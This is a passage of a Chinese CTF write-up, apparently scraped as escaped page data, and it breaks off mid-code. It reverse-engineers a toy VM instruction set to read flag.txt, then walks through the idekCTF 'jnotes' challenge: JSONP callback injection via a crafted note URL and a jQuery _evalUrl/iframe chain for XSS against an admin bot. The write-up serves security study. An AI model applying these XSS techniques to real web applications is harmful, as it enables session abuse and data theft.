playing\u003c/code\u003e，显然是结束符；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x01\u003c/code\u003e回显中没有\u003ccode class=\\\"x-inline-highlight\\\"\u003ereg index out of range\u003c/code\u003e，说明\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x01\u003c/code\u003e的入参应该是立即数或地址；如果用\u003ccode class=\\\"x-inline-highlight\\\"\u003ei\u003c/code\u003e打印信息，会发现数据被写进栈了，因此可以判断\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x01\u003c/code\u003e指令是\u003ccode class=\\\"x-inline-highlight\\\"\u003epush (imm)\u003c/code\u003e；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x02\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x03\u003c/code\u003e的入参与寄存器编号有关，并且用\u003ccode class=\\\"x-inline-highlight\\\"\u003ei\u003c/code\u003e打印信息发现\u003ccode class=\\\"x-inline-highlight\\\"\u003esp\u003c/code\u003e变了，判断分别是\u003ccode class=\\\"x-inline-highlight\\\"\u003epop (Rx)\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003epush (Rx)\u003c/code\u003e；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x06\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x07\u003c/code\u003e，输入\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x06\\\\x00\\\\x00\u0026#92;n\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x07\\\\x00\\\\x00\u0026#92;n\u003c/code\u003e都回显\u003ccode class=\\\"x-inline-highlight\\\"\u003eUnknown instruction at ip=0x3\u003c/code\u003e，说明取指取到了\u003ccode class=\\\"x-inline-highlight\\\"\u003e\u0026#92;n\u003c/code\u003e，也就是这两个指令都需要两个操作数作为参数，从后几个测试项的报错可以看出\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x06\u003c/code\u003e的第一个操作数是寄存器编号，而\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x07\u003c/code\u003e的第二个操作数是寄存器编号；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x08\u003c/code\u003e从测试的回显来看是无操作数指令，发现当\u003ccode class=\\\"x-inline-highlight\\\"\u003eR0\u003c/code\u003e大于\u003ccode class=\\\"x-inline-highlight\\\"\u003e4\u003c/code\u003e时会报错\u003ccode class=\\\"x-inline-highlight\\\"\u003eunknown syscall\u003c/code\u003e，判断是\u003ccode class=\\\"x-inline-highlight\\\"\u003esyscall\u003c/code\u003e指令；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"...\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"推理过程没有写的特别细致（sorry），最终得到的指令集如下：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"Instructions:\\n\\n\\\\x00: 0 opt(s),             halt\\n\\\\x01: 1 opt(s), data        push (imm)\\n\\\\x02: 1 opt(s), Rx          pop  (Rx)\\n\\\\x03: 1 opt(s), Rx          push (Rx)\\n\\\\x04: 1 opt(s), Rx          or   (Rx)       =\u003e R0 |= Rx\\n\\\\x05: 1 opt(s), Rx          xor  (Rx)       =\u003e R0 ^= Rx\\n\\\\x06: 2 opt(s), Rx, addr    load (Rx, data) =\u003e Rx = mem[addr]\\n\\\\x07: 2 opt(s), addr, Rx    store(addr, Rx) =\u003e mem[addr] = Rx\\n\\n\\\\x08: 0 opt(s),             syscall\\n                            R0         R1     R2     R3\\n                            0: read   (fd,    addr,  size)\\n                            1: write  (fd,    addr,  size)\\n                            2: open   (path,  flags)\\n                            3: close  (fd)\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"Instructions:\\n\\n\\\\x00: 0 opt(s),             halt\\n\\\\x01: 1 opt(s), data        push (imm)\\n\\\\x02: 1 opt(s), Rx          pop  (Rx)\\n\\\\x03: 1 opt(s), Rx          push (Rx)\\n\\\\x04: 1 opt(s), Rx          or   (Rx)       =\u003e R0 |= Rx\\n\\\\x05: 1 opt(s), Rx          xor  (Rx)       =\u003e R0 ^= Rx\\n\\\\x06: 2 opt(s), Rx, addr    load (Rx, data) =\u003e Rx = mem[addr]\\n\\\\x07: 2 opt(s), addr, Rx    store(addr, Rx) =\u003e mem[addr] = Rx\\n\\n\\\\x08: 0 opt(s),             syscall\\n                            R0         R1     R2     R3\\n                            0: read   (fd,    addr,  size)\\n                            1: write  (fd,    addr,  size)\\n                            2: open   (path,  flags)\\n                            3: close  (fd)\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"读出flag\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"系统调用号和参数含义（从\u003ccode class=\\\"x-inline-highlight\\\"\u003eR1\u003c/code\u003e开始传）是一致于Linux的。拿flag的思路是利用运算指令绕过过滤，构造出\u003ccode class=\\\"x-inline-highlight\\\"\u003eflag.txt\u003c/code\u003e字符串，然后\u003ccode class=\\\"x-inline-highlight\\\"\u003eopen\u003c/code\u003e文件，\u003ccode class=\\\"x-inline-highlight\\\"\u003eread\u003c/code\u003e内容到内存，最后用\u003ccode class=\\\"x-inline-highlight\\\"\u003ewrite\u003c/code\u003e输出。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$19\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1a\"}}]}]]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"idekCTF/web/jnotes（赛后）\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"题目文件\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"展示几个涉及到的关键文件：\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eserver.js\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"JavaScript\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$1b\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1c\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eviews/index.ejs\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003chtml\u003e\\n\\n\u003chead\u003e\\n    \u003clink rel=\\\"stylesheet\\\" href=\\\"/style.css\\\"\u003e\\n    \u003cscript src=\\\"https://code.jquery.com/jquery-3.7.1.js\\\"\\n        integrity=\\\"sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=\\\" crossorigin=\\\"anonymous\\\"\u003e\\n    \u003c/script\u003e\\n\u003c/head\u003e\\n\\n\u003ch1\u003ePost a \u003cem\u003eJNote\u003c/em\u003e\u003c/h1\u003e\\n\u003cform id=\\\"noteForm\\\"\u003e\\n    \u003ch2\u003eTitle\u003c/h2\u003e\\n    \u003cinput id=\\\"noteTitle\\\" name=\\\"noteTitle\\\" placeholder=\\\"title\\\" size=\\\"50\\\" /\u003e\\n    \u003c/br\u003e\\n    \u003ch2\u003eContent\u003c/h2\u003e\\n    \u003cinput id=\\\"noteContent\\\" name=\\\"noteContent\\\" placeholder=\\\"content\\\" size=\\\"50\\\"\u003e\u003c/input\u003e\\n    \u003c/br\u003e\\n    \u003c/br\u003e\\n    \u003cinput type=\\\"submit\\\" value=\\\"Post\\\" /\u003e\\n\u003c/form\u003e\\n\u003cp id=\\\"message\\\"\u003e\u003c/p\u003e\\n\\n\u003cfooter\u003e\\n    \u003cscript src=\\\"/index.js\\\"\u003e\u003c/script\u003e\\n\u003c/footer\u003e\\n\\n\u003c/html\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1d\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eviews/notes.ejs\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003chtml\u003e\\n\\n\u003chead\u003e\\n    \u003cmeta http-equiv=\\\"Content-Security-Policy\\\"\\n        content=\\\"default-src 'none'; script-src 'self' https://code.jquery.com/jquery-3.7.1.js; connect-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;\\\"\u003e\\n    \u003clink rel=\\\"stylesheet\\\" href=\\\"/style.css\\\"\u003e\\n    \u003cscript src=\\\"https://code.jquery.com/jquery-3.7.1.js\\\"\\n        integrity=\\\"sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=\\\" crossorigin=\\\"anonymous\\\"\u003e\\n    \u003c/script\u003e\\n    \u003cscript src=\\\"/view.js\\\"\u003e\u003c/script\u003e\\n\u003c/head\u003e\\n\\n\u003cbody\u003e\\n    \u003cscript defer src=\\\"/api/view/\u003c%= note %\u003e?callback=showNote\\\"\u003e\u003c/script\u003e\\n    \u003cdiv id=\\\"noteElement\\\"\u003e\\n        \u003ch1 id=\\\"noteTitle\\\"\u003e\u003c/h1\u003e\\n        \u003cp id=\\\"noteContent\\\"\u003e\u003c/p\u003e\\n    \u003c/div\u003e\\n\u003c/body\u003e\\n\\n\u003c/html\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 144px, transparent 144px, transparent 336px, var(--bg-transparent-golden) 336px 360px, transparent 360px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003epublic/view.js\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"JavaScript\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"function showNote(note) {\\n    titleElement = $(\\\"#noteTitle\\\");\\n    contentElement = $(\\\"#noteContent\\\");\\n    titleElement.text(note[\\\"noteTitle\\\"]);\\n    contentElement.html(note[\\\"noteContent\\\"]);\\n};\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1f\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"题目概览\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"题目是一个笔记应用，允许用户发送HTML笔记，笔记的内容通过\u003ccode class=\\\"x-inline-highlight\\\"\u003econtentElement.html(note[\\\"noteContent\\\"])\u003c/code\u003e展示，最终需要XSS带外Admin Bot对\u003ccode class=\\\"x-inline-highlight\\\"\u003e/api/flag\u003c/code\u003e的请求。Admin Bot的cookie是httpOnly的。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"笔记展示页面\u003ccode class=\\\"x-inline-highlight\\\"\u003e/note/...\u003c/code\u003e有CSP限制，可利用的点几乎只有\u003ccode class=\\\"x-inline-highlight\\\"\u003escript-src 'self'\u003c/code\u003e；\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex\u003c/code\u003e页面则没有CSP。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"题目的后端是Express，前端引入了jQuery，并且对\u003ccode class=\\\"x-inline-highlight\\\"\u003e/api/view/...\u003c/code\u003e的请求会返回一个JSONP格式的响应，本题就是需要用jQuery和JSONP组合来实现XSS。（框架都是最新版，不是Nday利用的题目。）\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"Admin Bot可以访问输入的任何URL，因此允许我们构造一个攻击页面并发送给Bot。\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"前期思路\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"首先，看到Express中处理JSONP的\u003ca href=\\\"https://github.com/expressjs/express/blob/master/lib/response.js#L267-L311\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003e源码\u003c/a\u003e：\u003ccode class=\\\"x-inline-highlight\\\"\u003ecallback = callback.replace(/[^\\\\[\\\\]\\\\w\u0026#36;.]/g, '');\u003c/code\u003e，这里只允许使用\u003ccode class=\\\"x-inline-highlight\\\"\u003eA-Za-z0-9[].\u0026#36;\u003c/code\u003e这些字符，无法通过在\u003ccode class=\\\"x-inline-highlight\\\"\u003ecallback\u003c/code\u003e中插入特殊字符进行注入。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003enotes.ejs\u003c/code\u003e中使用JSONP的方式为\u003ccode class=\\\"x-inline-highlight\\\"\u003esrc=\\\"/api/view/\u0026#60;%= note %\u0026#62;?callback=showNote\\\"\u003c/code\u003e，可以通过访问\u003ccode class=\\\"x-inline-highlight\\\"\u003e/note/anything%3fcallback=alert%23\u003c/code\u003e来触发\u003ccode class=\\\"x-inline-highlight\\\"\u003ealert\u003c/code\u003e，原理是替换进模板后引入的\u003ccode class=\\\"x-inline-highlight\\\"\u003esrc\u003c/code\u003e会变成\u003ccode class=\\\"x-inline-highlight\\\"\u003esrc=\\\"/api/view/anything?callback=alert#?callback=showNote\\\"\u003c/code\u003e。我们可以通过这个操作实现执行任意函数，比如：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ealert\u003c/code\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003econsole.log\u003c/code\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003edocument.firstElementChild.nextElementSibling.click\u003c/code\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003edocument.forms[0].submit\u003c/code\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"...\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"但可惜的是无法控制参数，当传入一个非法/不存在的\u003ccode class=\\\"x-inline-highlight\\\"\u003enote_id\u003c/code\u003e时，相当于对这个函数进行空参调用；当传入一个合法的\u003ccode class=\\\"x-inline-highlight\\\"\u003enote_id\u003c/code\u003e时，相当于有一个参数\u003ccode class=\\\"x-inline-highlight\\\"\u003enotes.get(req.params.note)\u003c/code\u003e，但这个参数仅当调用\u003ccode class=\\\"x-inline-highlight\\\"\u003eshowNote\u003c/code\u003e时才有意义。（或者用\u003ccode class=\\\"x-inline-highlight\\\"\u003econsole.log\u003c/code\u003e打印出来这个对象 ^v^）\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"Official Solution\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"官方解法的思路是构造一个攻击页面，通过\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e加载\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex\u003c/code\u003e页面（没有CSP），然后想办法在\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex\u003c/code\u003e页面中定义并执行\u003ccode class=\\\"x-inline-highlight\\\"\u003eshowNote\u003c/code\u003e函数。官方解法需要一些条件/特性：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"首先注意到\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex.ejs\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003enotes.ejs\u003c/code\u003e中都有\u003ccode class=\\\"x-inline-highlight\\\"\u003eid=\\\"noteContent\\\"\u003c/code\u003e的元素（一个是\u003ccode class=\\\"x-inline-highlight\\\"\u003einput\u003c/code\u003e，一个是\u003ccode class=\\\"x-inline-highlight\\\"\u003ep\u003c/code\u003e），这样保证了在\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex\u003c/code\u003e页面中执行\u003ccode class=\\\"x-inline-highlight\\\"\u003eshowNote\u003c/code\u003e时仍然可以设置\u003ccode class=\\\"x-inline-highlight\\\"\u003e#noteContent\u003c/code\u003e元素的HTML内容；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"jQuery的\u003ccode class=\\\"x-inline-highlight\\\"\u003e$.ajax(url)\u003c/code\u003e在空参调用时，会默认使用\u003ccode class=\\\"x-inline-highlight\\\"\u003elocation.href\u003c/code\u003e作为\u003ccode class=\\\"x-inline-highlight\\\"\u003eurl\u003c/code\u003e；\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"jQuery中有一个函数\u003ccode class=\\\"x-inline-highlight\\\"\u003e$._evalUrl(url)\u003c/code\u003e，可以解析执行\u003ccode class=\\\"x-inline-highlight\\\"\u003eurl\u003c/code\u003e返回的JavaScript代码：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"JavaScript\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"jQuery._evalUrl = function (url, options, doc) {\\n    return jQuery.ajax({\\n        url: url,\\n\\n        // Make this explicit, since user can override this through ajaxSetup (trac-11264)\\n        type: \\\"GET\\\",\\n        dataType: \\\"script\\\",\\n        cache: true,\\n        async: false,\\n        global: false,\\n\\n        // Only evaluate the response if it is successful (gh-4126)\\n        // dataFilter is not invoked for failure responses, so using it instead\\n        // of the default converter is kludgy but it works.\\n        converters: {\\n            \\\"text script\\\": function () {\\n            }\\n        },\\n        dataFilter: function (response) {\\n            jQuery.globalEval(response, options, doc);\\n        }\\n    });\\n};\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$20\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"尽管我们不能控制\u003ccode class=\\\"x-inline-highlight\\\"\u003eurl\u003c/code\u003e参数，注意到\u003ccode class=\\\"x-inline-highlight\\\"\u003ejQuery._evalUrl\u003c/code\u003e是使用\u003ccode class=\\\"x-inline-highlight\\\"\u003ejQuery.ajax\u003c/code\u003e的，因此空参调用时会解析并执行\u003ccode class=\\\"x-inline-highlight\\\"\u003elocation.href\u003c/code\u003e，我们需要\u003ccode class=\\\"x-inline-highlight\\\"\u003elocation.href\u003c/code\u003e指向一个返回JavaScript代码的URL。\"}}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eserver.js\u003c/code\u003e中的路由：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"JavaScript\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"/* index */\\napp.use(\\\"*path\\\", (req, res) =\u003e {\\n    return res.render(\\\"index\\\");\\n});\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token comment\\\"\u003e/* index */\u003c/span\u003e\\napp\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token function\\\"\u003euse\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"*path\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token parameter\\\"\u003ereq\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e res\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\\n    \u003cspan class=\\\"token keyword\\\"\u003ereturn\u003c/span\u003e res\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token function\\\"\u003erender\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"index\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"会在其他路由均失配时默认返回\u003ccode class=\\\"x-inline-highlight\\\"\u003eindex\u003c/code\u003e页面。\"}}]]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Step 1\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"首先，在攻击页面中创建这样一个\u003ccode class=\\\"x-inline-highlight\\\"\u003eiframe\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"HTML\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003ciframe srcdoc=\\\"\\n    \u003cform method='POST' action='{{target}}/view.js'\u003e\\n    \u003cscript\u003e\\n        document.forms[0].submit();\\n    \u003c/script\u003e\\n\\\"\u003e\u003c/iframe\u003e\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token tag\\\"\u003e\u003cspan class=\\\"token 